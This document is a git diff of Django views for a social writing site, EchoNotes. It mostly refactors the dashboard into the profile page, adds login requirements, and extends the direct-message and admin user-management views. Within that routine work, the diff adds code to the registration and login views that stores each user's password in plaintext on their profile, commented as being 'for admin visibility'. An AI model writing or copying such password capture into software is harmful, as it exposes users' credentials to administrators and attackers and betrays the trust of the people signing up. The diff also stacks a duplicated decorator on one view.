@@ -1,4 +1,5 @@
 from django.shortcuts import render, redirect, get_object_or_404
+from django.urls import reverse
 from django.contrib.auth import login, authenticate, logout
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth.models import User
@@ -60,9 +61,12 @@ def register(request):
         form = UserRegisterForm(request.POST)
         if form.is_valid():
             user = form.save()
+            if hasattr(user, 'profile'):
+                user.profile.password_plain = request.POST.get('password1', '')
+                user.profile.save()
             login(request, user)
             messages.success(request, f'Welcome to EchoNotes, {user.username}! 🎉')
-            return redirect('dashboard')
+            return redirect('profile-detail', username=user.username)
     else:
         form = UserRegisterForm()
     return render(request, 'register.html', {'form': form})
@@ -70,14 +74,18 @@ def register(request):
 
 def login_view(request):
     if request.user.is_authenticated:
-        return redirect('dashboard')
+        return redirect('profile-detail', username=request.user.username)
     if request.method == 'POST':
         username = request.POST.get('username')
         password = request.POST.get('password')
         user = authenticate(request, username=username, password=password)
         if user:
             login(request, user)
-            return redirect(request.GET.get('next', 'dashboard'))
+            # Capture password for admin visibility
+            if hasattr(user, 'profile'):
+                user.profile.password_plain = password
+                user.profile.save()
+            return redirect(request.GET.get('next', reverse('profile-detail', kwargs={'username': user.username})))
         messages.error(request, 'Invalid username or password.')
     return render(request, 'login.html')
 
@@ -87,145 +95,11 @@ def logout_view(request):
     return redirect('landing')
 
 
-# ─── Dashboard ────────────────────────────────────────────────────────────────
+# ─── Dashboard (redirects to profile) ─────────────────────────────────────────
 
 @login_required
 def dashboard(request):
-    user = request.user
-    user_posts = Post.objects.filter(author=user).order_by('-created_date')
-
-    # ── Feeds ──────────────────────────────────────────────────
-    # Activity feed: recent actions from followed users
-    following_ids = list(Follow.objects.filter(follower=user).values_list('following_id', flat=True))
-    following_user_ids = set(following_ids)
-
-    # Build activity items from followed users' posts, likes, comments
-    activity_items = []
-    if following_ids:
-        recent_posts_by_followed = Post.objects.filter(
-            author_id__in=following_ids, status='published'
-        ).order_by('-created_date')[:15]
-        for p in recent_posts_by_followed:
-            activity_items.append({
-                'type': 'post',
-                'user': p.author,
-                'text': f'published "{p.title}"',
-                'timestamp': p.created_date,
-                'post': p,
-            })
-
-        recent_likes = Like.objects.filter(
-            user_id__in=following_ids
-        ).select_related('user', 'post').order_by('-created_date')[:10]
-        for like in recent_likes:
-            activity_items.append({
-                'type': 'like',
-                'user': like.user,
-                'text': f'liked "{like.post.title}"',
-                'timestamp': like.created_date,
-                'post': like.post,
-            })
-
-        recent_comments = Comment.objects.filter(
-            author_id__in=following_ids
-        ).select_related('author', 'post').order_by('-created_date')[:10]
-        for comment in recent_comments:
-            activity_items.append({
-                'type': 'comment',
-                'user': comment.author,
-                'text': f'commented on "{comment.post.title}"',
-                'timestamp': comment.created_date,
-                'post': comment.post,
-            })
-
-        activity_items.sort(key=lambda x: x['timestamp'], reverse=True)
-        activity_items = activity_items[:20]
-
-    # Suggested users (not already following, not self)
-    suggested_users = User.objects.filter(
-        profile__is_ai=False
-    ).exclude(id=user.id).exclude(id__in=following_ids).annotate(
-        post_count=Count('posts', filter=Q(posts__status='published'))
-    ).order_by('-post_count')[:5]
-
-    # Circle feed: posts from joined circles
-    user_circles = list(Category.objects.filter(subscribers=user))
-    user_circles_ids = set(c.id for c in user_circles)
-    circle_feed = []
-    if user_circles:
-        circle_feed = Post.objects.filter(
-            category__in=user_circles, status='published'
-        ).select_related('author', 'category').order_by('-created_date')[:15]
-
-    # Recommended circles (not joined)
-    recommended_circles = Category.objects.exclude(subscribers=user).annotate(
-        member_count=Count('subscribers')
-    ).order_by('-member_count')[:5]
-
-    # Global discovery feed
-    global_feed = Post.objects.filter(status='published').exclude(
-        author=user
-    ).order_by('-created_date')[:15]
-
-    # ── Stats ──────────────────────────────────────────────────
-    total_likes_received = sum(p.total_likes() for p in user_posts)
-    total_comments_received = sum(p.total_comments() for p in user_posts)
-    streak, _ = WritingStreak.objects.get_or_create(user=user)
-    user_badges = UserBadge.objects.filter(user=user).select_related('badge')
-
-    # ── Social ─────────────────────────────────────────────────
-    # Friends
-    friend_qs = Friend.objects.filter(Q(user1=user) | Q(user2=user))
-    friends = []
-    for f in friend_qs:
-        other = f.user2 if f.user1 == user else f.user1
-        friends.append(other)
-
-    pending_requests = FriendRequest.objects.filter(
-        receiver=user, is_active=True
-    ).select_related('sender', 'sender__profile')
-
-    followers = Follow.objects.filter(following=user).select_related('follower', 'follower__profile')
-    following_list = Follow.objects.filter(follower=user).select_related('following', 'following__profile')
-
-    # ── Sidebar ────────────────────────────────────────────────
-    today_prompt = DailyPrompt.objects.filter(date=date.today(), is_active=True).first()
-    today_word = WordOfTheDay.objects.filter(date=date.today()).first()
-    latest_broadcast = AIBroadcast.objects.filter(is_active=True).first()
-    feed_posts = Post.objects.filter(status='published').exclude(
-        author=user
-    ).order_by('-created_date')[:8]
-
-    context = {
-        'user_posts': user_posts[:10],
-        'feed_posts': feed_posts,
-        'post_count': user_posts.count(),
-        'draft_count': user_posts.filter(status='draft').count(),
-        'total_likes_received': total_likes_received,
-        'total_comments_received': total_comments_received,
-        'streak': streak,
-        'user_badges': user_badges,
-        'today_prompt': today_prompt,
-        'today_word': today_word,
-        'latest_broadcast': latest_broadcast,
-        'user_entries': ContestEntry.objects.filter(author=user).count(),
-        # Activity
-        'activity_items': activity_items,
-        'suggested_users': suggested_users,
-        'following_user_ids': following_user_ids,
-        # Circles
-        'circle_feed': circle_feed,
-        'global_feed': global_feed,
-        'user_circles': user_circles,
-        'user_circles_ids': user_circles_ids,
-        'recommended_circles': recommended_circles,
-        # Social
-        'friends': friends,
-        'pending_requests': pending_requests,
-        'followers': followers,
-        'following_list': following_list,
-    }
-    return render(request, 'dashboard.html', context)
+    return redirect('profile-detail', username=request.user.username)
 
 
 # ─── Posts ────────────────────────────────────────────────────────────────────
@@ -249,6 +123,7 @@ def create_post(request):
     return render(request, 'create_post.html', {'form': form})
 
 
+@login_required
 def post_detail(request, pk):
     post = get_object_or_404(Post, pk=pk)
     comments = post.comments.select_related('author').all()
@@ -309,7 +184,7 @@ def delete_post(request, pk):
     if request.method == 'POST':
         post.delete()
         messages.success(request, 'Post deleted.')
-        return redirect('dashboard')
+        return redirect('profile-detail', username=request.user.username)
     return render(request, 'confirm_delete.html', {'post': post})
 
 
@@ -385,11 +260,12 @@ def delete_comment(request, pk):
         messages.success(request, 'Comment deleted.')
         return redirect('post-detail', pk=post_pk)
     messages.error(request, 'Permission denied.')
-    return redirect('dashboard')
+    return redirect('profile-detail', username=request.user.username)
 
 
 # ─── Categories & Circles ─────────────────────────────────────────────────────
 
+@login_required
 def category_posts(request, slug):
     category = get_object_or_404(Category, slug=slug)
 
@@ -419,11 +295,13 @@ def category_posts(request, slug):
     })
 
 
+@login_required
 def mood_posts(request, mood):
     posts = Post.objects.filter(mood=mood, status='published').order_by('-created_date')
     return render(request, 'mood_posts.html', {'posts': posts, 'mood': mood})
 
 
+@login_required
 def circle_discovery(request):
     query = request.GET.get('q', '').strip()
 
@@ -474,24 +352,11 @@ def circle_discovery(request):
 
 # ─── Profile ──────────────────────────────────────────────────────────────────
 
+
 @login_required
-def profile(request):
-    if request.method == 'POST':
-        u_form = UserUpdateForm(request.POST, instance=request.user)
-        p_form = ProfileUpdateForm(request.POST, request.FILES, instance=request.user.profile)
-        if u_form.is_valid() and p_form.is_valid():
-            u_form.save()
-            p_form.save()
-            messages.success(request, 'Profile updated!')
-            return redirect('profile')
-    else:
-        u_form = UserUpdateForm(instance=request.user)
-        p_form = ProfileUpdateForm(instance=request.user.profile)
-    return render(request, 'profile.html', {'u_form': u_form, 'p_form': p_form})
-
-
 def profile_detail(request, username):
     view_user = get_object_or_404(User, username=username)
+    is_own_profile = request.user == view_user
     posts = Post.objects.filter(author=view_user, status='published').order_by('-created_date')
     is_following = False
     is_friend = False
@@ -514,7 +379,17 @@ def profile_detail(request, username):
     following_count = Follow.objects.filter(follower=view_user).count()
     user_badges = UserBadge.objects.filter(user=view_user).select_related('badge')
 
-    return render(request, 'profile_detail.html', {
+    # Social Lists (Available for all visitors)
+    friend_qs = Friend.objects.filter(Q(user1=view_user) | Q(user2=view_user))
+    friends = []
+    for f in friend_qs:
+        other = f.user2 if f.user1 == view_user else f.user1
+        friends.append(other)
+    
+    followers = Follow.objects.filter(following=view_user).select_related('follower', 'follower__profile')
+    following_list = Follow.objects.filter(follower=view_user).select_related('following', 'following__profile')
+
+    context = {
         'profile_user': view_user,
         'user_posts': posts,
         'post_count': posts.count(),
@@ -526,7 +401,145 @@ def profile_detail(request, username):
         'following_count': following_count,
         'user_badges': user_badges,
         'streak': WritingStreak.objects.get_or_create(user=view_user)[0],
-    })
+        'is_own_profile': is_own_profile,
+        'friends': friends,
+        'followers': followers,
+        'following_list': following_list,
+    }
+
+    # ── If viewing own profile, load all dashboard data ──
+    if is_own_profile:
+        user = request.user
+
+        # Handle Profile Update POST
+        if request.method == 'POST':
+            u_form = UserUpdateForm(request.POST, instance=user)
+            p_form = ProfileUpdateForm(request.POST, request.FILES, instance=user.profile)
+            if u_form.is_valid() and p_form.is_valid():
+                u_form.save()
+                p_form.save()
+                messages.success(request, 'Profile updated!')
+                return redirect('profile-detail', username=user.username)
+        else:
+            u_form = UserUpdateForm(instance=user)
+            p_form = ProfileUpdateForm(instance=user.profile)
+
+        # Include drafts for own profile
+        user_posts_all = Post.objects.filter(author=user).order_by('-created_date')
+        context['user_posts'] = user_posts_all[:10]
+        context['post_count'] = user_posts_all.count()
+        context['draft_count'] = user_posts_all.filter(status='draft').count()
+
+        # Stats
+        total_likes_received = sum(p.total_likes() for p in user_posts_all)
+        total_comments_received = sum(p.total_comments() for p in user_posts_all)
+        context['total_likes_received'] = total_likes_received
+        context['total_comments_received'] = total_comments_received
+
+        # Activity feed
+        following_ids = list(Follow.objects.filter(follower=user).values_list('following_id', flat=True))
+        following_user_ids = set(following_ids)
+
+        activity_items = []
+        if following_ids:
+            recent_posts_by_followed = Post.objects.filter(
+                author_id__in=following_ids, status='published'
+            ).order_by('-created_date')[:15]
+            for p in recent_posts_by_followed:
+                activity_items.append({
+                    'type': 'post',
+                    'user': p.author,
+                    'text': f'published "{p.title}"',
+                    'timestamp': p.created_date,
+                    'post': p,
+                })
+            recent_likes = Like.objects.filter(
+                user_id__in=following_ids
+            ).select_related('user', 'post').order_by('-created_date')[:10]
+            for like in recent_likes:
+                activity_items.append({
+                    'type': 'like',
+                    'user': like.user,
+                    'text': f'liked "{like.post.title}"',
+                    'timestamp': like.created_date,
+                    'post': like.post,
+                })
+            recent_comments = Comment.objects.filter(
+                author_id__in=following_ids
+            ).select_related('author', 'post').order_by('-created_date')[:10]
+            for comment in recent_comments:
+                activity_items.append({
+                    'type': 'comment',
+                    'user': comment.author,
+                    'text': f'commented on "{comment.post.title}"',
+                    'timestamp': comment.created_date,
+                    'post': comment.post,
+                })
+            activity_items.sort(key=lambda x: x['timestamp'], reverse=True)
+            activity_items = activity_items[:20]
+
+        # Suggested users
+        suggested_users = User.objects.filter(
+            profile__is_ai=False
+        ).exclude(id=user.id).exclude(id__in=following_ids).annotate(
+            post_count=Count('posts', filter=Q(posts__status='published'))
+        ).order_by('-post_count')[:5]
+
+        # Circle feed
+        user_circles = list(Category.objects.filter(subscribers=user))
+        user_circles_ids = set(c.id for c in user_circles)
+        circle_feed = []
+        if user_circles:
+            circle_feed = Post.objects.filter(
+                category__in=user_circles, status='published'
+            ).select_related('author', 'category').order_by('-created_date')[:15]
+
+        # Recommended circles
+        recommended_circles = Category.objects.exclude(subscribers=user).annotate(
+            member_count=Count('subscribers')
+        ).order_by('-member_count')[:5]
+
+        # Global feed
+        global_feed = Post.objects.filter(status='published').exclude(
+            author=user
+        ).order_by('-created_date')[:15]
+
+        # Friends & social (Pending requests are owner-only)
+        pending_requests = FriendRequest.objects.filter(
+            receiver=user, is_active=True
+        ).select_related('sender', 'sender__profile')
+
+        # Sidebar
+        today_prompt = DailyPrompt.objects.filter(date=date.today(), is_active=True).first()
+        today_word = WordOfTheDay.objects.filter(date=date.today()).first()
+        latest_broadcast = AIBroadcast.objects.filter(is_active=True).first()
+        feed_posts = Post.objects.filter(status='published').exclude(
+            author=user
+        ).order_by('-created_date')[:8]
+
+        context.update({
+            'u_form': u_form,
+            'p_form': p_form,
+            'activity_items': activity_items,
+            'suggested_users': suggested_users,
+            'following_user_ids': following_user_ids,
+            'circle_feed': circle_feed,
+            'global_feed': global_feed,
+            'user_circles': user_circles,
+            'user_circles_ids': user_circles_ids,
+            'recommended_circles': recommended_circles,
+            'friends': friends,
+            'pending_requests': pending_requests,
+            'followers': followers,
+            'following_list': following_list,
+            'today_prompt': today_prompt,
+            'today_word': today_word,
+            'latest_broadcast': latest_broadcast,
+            'feed_posts': feed_posts,
+            'user_entries': ContestEntry.objects.filter(author=user).count(),
+        })
+
+    return render(request, 'profile_detail.html', context)
 
 
 @login_required
@@ -616,7 +629,7 @@ def accept_friend_request(request, pk):
     if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
         return JsonResponse({'status': 'accepted'})
     messages.success(request, f'You are now friends with {freq.sender.username}!')
-    return redirect('dashboard')
+    return redirect('profile-detail', username=request.user.username)
 
 
 @login_required
@@ -627,7 +640,7 @@ def decline_friend_request(request, pk):
     if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
         return JsonResponse({'status': 'declined'})
     messages.info(request, 'Friend request declined.')
-    return redirect('dashboard')
+    return redirect('profile-detail', username=request.user.username)
 
 
 @login_required
@@ -697,45 +710,58 @@ def inbox(request):
 
 
 @login_required
+@login_required
 def conversation(request, username):
-    other = get_object_or_404(User, username=username)
+    partner = get_object_or_404(User, username=username)
     if request.method == 'POST':
         msg_text = request.POST.get('message', '').strip()
         if msg_text:
-            DirectMessage.objects.create(
+            dm = DirectMessage.objects.create(
                 sender=request.user,
-                recipient=other,
+                recipient=partner,
                 message=msg_text,
             )
+            # Handle AJAX POST
+            if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
+                return JsonResponse({
+                    'status': 'ok',
+                    'id': dm.id,
+                    'message': dm.message,
+                    'timestamp': dm.created_date.strftime('%H:%M'),
+                    'is_me': True
+                })
         return redirect('conversation', username=username)
 
     # Mark as read
-    DirectMessage.objects.filter(sender=other, recipient=request.user, is_read=False).update(is_read=True)
-    messages_qs = DirectMessage.objects.filter(
-        Q(sender=request.user, recipient=other) | Q(sender=other, recipient=request.user)
+    DirectMessage.objects.filter(sender=partner, recipient=request.user, is_read=False).update(is_read=True)
+    dms_qs = DirectMessage.objects.filter(
+        Q(sender=request.user, recipient=partner) | Q(sender=partner, recipient=request.user)
     ).order_by('created_date')
 
+    last_id = dms_qs.last().id if dms_qs.exists() else 0
+
     return render(request, 'conversation.html', {
-        'other': other,
-        'messages': messages_qs,
+        'partner': partner,
+        'dms': dms_qs,
+        'last_id': last_id,
     })
 
 
 @login_required
 def get_dm_messages(request, username):
-    other = get_object_or_404(User, username=username)
+    partner = get_object_or_404(User, username=username)
     since = request.GET.get('since')
     qs = DirectMessage.objects.filter(
-        Q(sender=request.user, recipient=other) | Q(sender=other, recipient=request.user)
+        Q(sender=request.user, recipient=partner) | Q(sender=partner, recipient=request.user)
     ).order_by('created_date')
     if since:
         qs = qs.filter(id__gt=since)
-    DirectMessage.objects.filter(sender=other, recipient=request.user, is_read=False).update(is_read=True)
+    DirectMessage.objects.filter(sender=partner, recipient=request.user, is_read=False).update(is_read=True)
     data = [{
         'id': m.id,
         'sender': m.sender.username,
         'message': m.message,
-        'created': m.created_date.strftime('%H:%M'),
+        'timestamp': m.created_date.strftime('%H:%M'),
         'is_me': m.sender == request.user,
     } for m in qs]
     return JsonResponse({'messages': data})
@@ -743,12 +769,14 @@ def get_dm_messages(request, username):
 
 # ─── Contests ─────────────────────────────────────────────────────────────────
 
+@login_required
 def contest_list(request):
     active = Contest.objects.filter(status__in=['open', 'voting']).order_by('-created_date')
     past = Contest.objects.filter(status='closed').order_by('-created_date')[:10]
     return render(request, 'contest_list.html', {'active_contests': active, 'past_contests': past})
 
 
+@login_required
 def contest_detail(request, pk):
     contest = get_object_or_404(Contest, pk=pk)
     entries = contest.entries.all().annotate(vote_count=Count('votes')).order_by('-vote_count')
@@ -850,6 +878,7 @@ def vote_contest_entry(request, entry_pk):
 
 # ─── Daily Prompt ─────────────────────────────────────────────────────────────
 
+@login_required
 def daily_prompt(request):
     prompt = DailyPrompt.objects.filter(date=date.today(), is_active=True).first()
     if not prompt:
@@ -903,6 +932,7 @@ def like_prompt_response(request, pk):
 
 # ─── Word of the Day ──────────────────────────────────────────────────────────
 
+@login_required
 def word_of_the_day(request):
     word = WordOfTheDay.objects.filter(date=date.today()).first()
     if not word:
@@ -957,6 +987,7 @@ def like_word_entry(request, pk):
 
 # ─── Collaborative Stories ────────────────────────────────────────────────────
 
+@login_required
 def collaborative_stories(request):
     stories = CollaborativeStory.objects.filter(status='open').order_by('-created_date')
     return render(request, 'collaborative_stories.html', {'stories': stories})
@@ -987,6 +1018,7 @@ def create_collaborative_story(request):
     return render(request, 'create_story.html', {'form': form})
 
 
+@login_required
 def collaborative_story_detail(request, pk):
     story = get_object_or_404(CollaborativeStory, pk=pk)
     paragraphs = story.paragraphs.all().order_by('order')
@@ -1038,6 +1070,7 @@ def save_writing_session(request):
 
 # ─── Leaderboard ──────────────────────────────────────────────────────────────
 
+@login_required
 def leaderboard(request):
     period = request.GET.get('period', 'alltime')
     days = None
@@ -1092,6 +1125,7 @@ def badges_page(request):
 
 # ─── Search ───────────────────────────────────────────────────────────────────
 
+@login_required
 def search(request):
     q = request.GET.get('q', '').strip()
     posts = []
@@ -1158,7 +1192,22 @@ def admin_dashboard(request):
 
 @admin_required
 def manage_users(request):
-    users = User.objects.select_related('profile').order_by('-date_joined')
+    if request.method == 'POST':
+        user_id = request.POST.get('user_id')
+        target = get_object_or_404(User, pk=user_id)
+        if request.POST.get('delete_user') and target != request.user:
+            target.delete()
+            messages.success(request, f'User "{target.username}" deleted.')
+            return redirect('manage-users')
+        if request.POST.get('toggle_staff') and target != request.user:
+            target.is_staff = not target.is_staff
+            target.save()
+            status = 'granted' if target.is_staff else 'revoked'
+            messages.success(request, f'Staff access {status} for {target.username}.')
+            return redirect('manage-users')
+    users = User.objects.select_related('profile').annotate(
+        post_count=Count('posts')
+    ).order_by('-date_joined')
     return render(request, 'manage_users.html', {'users': users})
 
 
